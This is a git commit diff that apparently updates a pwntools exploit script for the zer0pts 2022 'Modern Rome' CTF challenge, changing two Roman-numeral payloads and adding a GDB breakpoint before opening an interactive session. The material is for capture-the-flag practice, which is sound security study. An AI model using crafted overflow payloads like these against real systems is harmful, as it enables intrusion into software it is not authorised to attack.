1a304ca8db3ff69af1d24f259e9affc10f24aa67
EsharkyTheGreat <eshwars1210@gmail.com>
2022-03-21 14:46:15 +0530

    zer0pts modern rome solve

--- zer0pts-22/ModernRome/modern-rome/exp.py
+++ zer0pts-22/ModernRome/modern-rome/exp.py
@@ -6,12 +6,12 @@ pwn.context.terminal = ['tmux', 'splitw', '-h']
 
 elf = pwn.ELF("./chall")
 if pwn.args.GDB:
-    io = pwn.gdb.debug(elf.path)
+    io = pwn.gdb.debug(elf.path,gdbscript='b *main+225\n')
 else:
     io = elf.process()
 
-payload1 = b'\0' * 6 + b'M' * 5 + b'C' * 1 + b'X' * 4 + b'I' * 8
-payload2 = b'I' * 8 + b'\0' * 6
+payload1 = b'\0' * 6 + b'M' * 5 + b'C' * 1 + b'X' * 6 + b'I' * 4
+payload2 = b'\0' * 0 + b'M' * 4 + b'C' * 8 + b'X' * 5 + b'I' * 4
 io.sendline(payload1)
 io.sendline(payload2)
 io.interactive()
